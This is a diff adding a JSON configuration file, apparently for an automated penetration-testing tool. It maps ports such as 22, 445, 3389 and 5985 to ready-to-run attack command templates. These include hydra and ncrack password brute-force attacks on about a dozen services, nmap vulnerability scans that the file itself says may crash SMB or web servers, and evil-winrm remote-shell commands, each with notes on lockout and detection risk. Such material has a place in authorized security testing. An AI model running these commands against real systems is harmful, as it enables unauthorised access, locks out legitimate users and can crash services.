@@ -1,0 +1,270 @@
+{
+  "21": [
+    {
+      "name": "FTP brute-force (hydra)",
+      "tool": "hydra",
+      "command_template": "hydra -L {userlist} -P {passlist} -t 4 -o hydra_ftp.txt ftp://{target} -V",
+      "impact": "FTP account lockout policy may lock users; audit log records every attempt.",
+      "is_recommended": true
+    }
+  ],
+  "22": [
+    {
+      "name": "SSH brute-force (hydra) — recommended",
+      "tool": "hydra",
+      "command_template": "hydra -L {userlist} -P {passlist} -t 4 -o hydra_ssh.txt ssh://{target} -V",
+      "impact": "SSH server logs every attempt; Fail2Ban / DenyHosts may block your IP.",
+      "is_recommended": true
+    },
+    {
+      "name": "SSH brute-force (ncrack) — alternative",
+      "tool": "ncrack",
+      "command_template": "ncrack -U {userlist} -P {passlist} -p SSH --log=ncrack_ssh.log {target}",
+      "impact": "Same as hydra — faster but equally noisy.",
+      "is_recommended": false
+    }
+  ],
+  "23": [
+    {
+      "name": "Telnet brute-force (hydra)",
+      "tool": "hydra",
+      "command_template": "hydra -L {userlist} -P {passlist} -t 4 -o hydra_telnet.txt telnet://{target} -V",
+      "impact": "Telnet is plaintext; all authentication attempts logged in syslog.",
+      "is_recommended": true
+    }
+  ],
+  "25": [
+    {
+      "name": "SMTP command & user enumeration (nmap NSE)",
+      "tool": "nmap",
+      "command_template": "nmap --script smtp-commands,smtp-enum-users -p 25 -oN smtp_enum.log {target}",
+      "impact": "Low impact — queries SMTP server capabilities and user list.",
+      "is_recommended": true
+    }
+  ],
+  "80": [
+    {
+      "name": "HTTP vulnerability scan (nmap NSE)",
+      "tool": "nmap",
+      "command_template": "nmap --script http-vuln* -p 80 -oN http80_vuln.log {target}",
+      "impact": "Some NSE scripts (http-shellshock) may crash the HTTP service.",
+      "is_recommended": true
+    },
+    {
+      "name": "HTTP form brute-force (hydra)",
+      "tool": "hydra",
+      "command_template": "hydra -L {userlist} -P {passlist} -t 4 -o hydra_http80.txt http-post-form://{target}:80/login.php:user=^USER^&pass=^PASS^:F=incorrect -V",
+      "impact": "WAF / ModSecurity may block your IP; access log volume spikes.",
+      "is_recommended": true
+    }
+  ],
+  "135": [
+    {
+      "name": "MSRPC endpoint enumeration (nmap NSE)",
+      "tool": "nmap",
+      "command_template": "nmap --script msrpc-enum -p 135 -oN msrpc_enum.log {target}",
+      "impact": "Low impact — queries RPC endpoint mapper.",
+      "is_recommended": true
+    }
+  ],
+  "139": [
+    {
+      "name": "NetBIOS OS and share enumeration (nmap NSE)",
+      "tool": "nmap",
+      "command_template": "nmap --script smb-os-discovery,nbstat -p 139 -oN netbios_enum.log {target}",
+      "impact": "Low impact.",
+      "is_recommended": true
+    }
+  ],
+  "389": [
+    {
+      "name": "LDAP directory enumeration (nmap NSE)",
+      "tool": "nmap",
+      "command_template": "nmap --script ldap-* -p 389 -oN ldap_enum.log {target}",
+      "impact": "Low impact — sends LDAP queries.",
+      "is_recommended": true
+    }
+  ],
+  "443": [
+    {
+      "name": "HTTPS vulnerability + SSL scan (nmap NSE)",
+      "tool": "nmap",
+      "command_template": "nmap --script http-vuln*,ssl-* -p 443 -oN https443_vuln.log {target}",
+      "impact": "SSL scripts are safe; HTTP vuln scripts may crash the service.",
+      "is_recommended": true
+    },
+    {
+      "name": "HTTPS form brute-force (hydra)",
+      "tool": "hydra",
+      "command_template": "hydra -L {userlist} -P {passlist} -t 4 -o hydra_https443.txt https-post-form://{target}:443/login.php:user=^USER^&pass=^PASS^:F=incorrect -V",
+      "impact": "Cloudflare / WAF / rate-limit may block your IP.",
+      "is_recommended": true
+    }
+  ],
+  "445": [
+    {
+      "name": "SMB vulnerability scan (EternalBlue, etc.)",
+      "tool": "nmap",
+      "command_template": "nmap --script smb-vuln* -p 445 -oN smb445_vuln.log {target}",
+      "impact": "CRITICAL: smb-vuln-ms17-010 may cause SMB server BSOD / crash.",
+      "is_recommended": true
+    },
+    {
+      "name": "SMB OS, shares & users enumeration (nmap NSE)",
+      "tool": "nmap",
+      "command_template": "nmap --script smb-os-discovery,smb-enum-shares,smb-enum-users -p 445 -oN smb445_enum.log {target}",
+      "impact": "Low impact — Windows Event IDs 5140, 5145 generated.",
+      "is_recommended": true
+    },
+    {
+      "name": "SMB brute-force (hydra) — recommended",
+      "tool": "hydra",
+      "command_template": "hydra -L {userlist} -P {passlist} -t 4 -o hydra_smb.txt smb://{target} -V",
+      "impact": "CRITICAL: Account lockout policy may lock domain users.",
+      "is_recommended": true
+    },
+    {
+      "name": "SMB brute-force (ncrack) — alternative",
+      "tool": "ncrack",
+      "command_template": "ncrack -U {userlist} -P {passlist} -p SMB --log=ncrack_smb.log {target}",
+      "impact": "Security Event ID 4625 volume may trigger EDR alerts.",
+      "is_recommended": false
+    }
+  ],
+  "1433": [
+    {
+      "name": "MSSQL brute-force (hydra)",
+      "tool": "hydra",
+      "command_template": "hydra -L {userlist} -P {passlist} -t 4 -o hydra_mssql.txt mssql://{target} -V",
+      "impact": "SQL Server Error Log fills with login failed entries.",
+      "is_recommended": true
+    }
+  ],
+  "3306": [
+    {
+      "name": "MySQL brute-force (hydra)",
+      "tool": "hydra",
+      "command_template": "hydra -L {userlist} -P {passlist} -t 4 -o hydra_mysql.txt mysql://{target} -V",
+      "impact": "MySQL general log volume increases; may cause temporary DB latency.",
+      "is_recommended": true
+    }
+  ],
+  "3389": [
+    {
+      "name": "RDP brute-force (hydra) — stable, recommended",
+      "tool": "hydra",
+      "command_template": "hydra -L {userlist} -P {passlist} -t 4 -o hydra_rdp.txt rdp://{target} -V",
+      "impact": "CRITICAL: Account lockout policy may lock domain users entirely.",
+      "is_recommended": true
+    },
+    {
+      "name": "RDP brute-force (ncrack) — faster alternative",
+      "tool": "ncrack",
+      "command_template": "ncrack -U {userlist} -P {passlist} -p RDP --log=ncrack_rdp.log {target}",
+      "impact": "Same account lockout risk; high Event ID 4625 volume.",
+      "is_recommended": false
+    }
+  ],
+  "5432": [
+    {
+      "name": "PostgreSQL brute-force (hydra)",
+      "tool": "hydra",
+      "command_template": "hydra -L {userlist} -P {passlist} -t 4 -o hydra_pgsql.txt postgres://{target} -V",
+      "impact": "PostgreSQL log contains failed auth entries.",
+      "is_recommended": true
+    }
+  ],
+  "5900": [
+    {
+      "name": "VNC brute-force (hydra) on port 5900",
+      "tool": "hydra",
+      "command_template": "hydra -L {userlist} -P {passlist} -t 4 -o hydra_vnc5900.txt vnc://{target} -V",
+      "impact": "VNC server may lag under repeated auth attempts.",
+      "is_recommended": true
+    }
+  ],
+  "5901": [
+    {
+      "name": "VNC brute-force (hydra) on port 5901",
+      "tool": "hydra",
+      "command_template": "hydra -L {userlist} -P {passlist} -t 4 -o hydra_vnc5901.txt vnc://{target}:5901 -V",
+      "impact": "Same as VNC 5900.",
+      "is_recommended": true
+    }
+  ],
+  "5985": [
+    {
+      "name": "WinRM brute-force (hydra)",
+      "tool": "hydra",
+      "command_template": "hydra -L {userlist} -P {passlist} -t 4 -o hydra_winrm5985.txt winrm://{target} -V",
+      "impact": "Windows Security Event ID 4625 volume spikes; account lockout risk.",
+      "is_recommended": true
+    },
+    {
+      "name": "WinRM shell via evil-winrm (requires credential first)",
+      "tool": "evil-winrm",
+      "command_template": "evil-winrm -i {target} -u {username} -p '{password}'",
+      "impact": "Active WinRM session — Event IDs 4648 (logon) and 4672 (admin) are generated.",
+      "is_recommended": true
+    }
+  ],
+  "5986": [
+    {
+      "name": "WinRM HTTPS brute-force (hydra)",
+      "tool": "hydra",
+      "command_template": "hydra -L {userlist} -P {passlist} -t 4 -o hydra_winrm5986.txt winrm://{target} -s 5986 -V",
+      "impact": "Same as 5985 — Security Event ID 4625 volume.",
+      "is_recommended": true
+    },
+    {
+      "name": "WinRM HTTPS shell via evil-winrm (requires credential first)",
+      "tool": "evil-winrm",
+      "command_template": "evil-winrm -i {target} -u {username} -p '{password}' -S",
+      "impact": "WinRM over SSL — log footprint identical to 5985.",
+      "is_recommended": true
+    }
+  ],
+  "6379": [
+    {
+      "name": "Redis brute-force (hydra)",
+      "tool": "hydra",
+      "command_template": "hydra -L {userlist} -P {passlist} -t 4 -o hydra_redis.txt redis://{target} -V",
+      "impact": "Redis log grows; potential latency increase.",
+      "is_recommended": true
+    }
+  ],
+  "8080": [
+    {
+      "name": "HTTP (8080) vulnerability scan (nmap NSE)",
+      "tool": "nmap",
+      "command_template": "nmap --script http-vuln* -p 8080 -oN http8080_vuln.log {target}",
+      "impact": "May crash the web service.",
+      "is_recommended": true
+    },
+    {
+      "name": "HTTP (8080) form brute-force (hydra)",
+      "tool": "hydra",
+      "command_template": "hydra -L {userlist} -P {passlist} -t 4 -o hydra_http8080.txt http-post-form://{target}:8080/login.php:user=^USER^&pass=^PASS^:F=incorrect -V",
+      "impact": "Reverse proxy or WAF may block your IP.",
+      "is_recommended": true
+    }
+  ],
+  "8443": [
+    {
+      "name": "HTTPS (8443) vulnerability + SSL scan (nmap NSE)",
+      "tool": "nmap",
+      "command_template": "nmap --script http-vuln*,ssl-* -p 8443 -oN https8443_vuln.log {target}",
+      "impact": "Same risk profile as port 443.",
+      "is_recommended": true
+    }
+  ],
+  "27017": [
+    {
+      "name": "MongoDB brute-force (hydra)",
+      "tool": "hydra",
+      "command_template": "hydra -L {userlist} -P {passlist} -t 4 -o hydra_mongo.txt mongodb://{target} -V",
+      "impact": "MongoDB audit log volume increases.",
+      "is_recommended": true
+    }
+  ]
+}
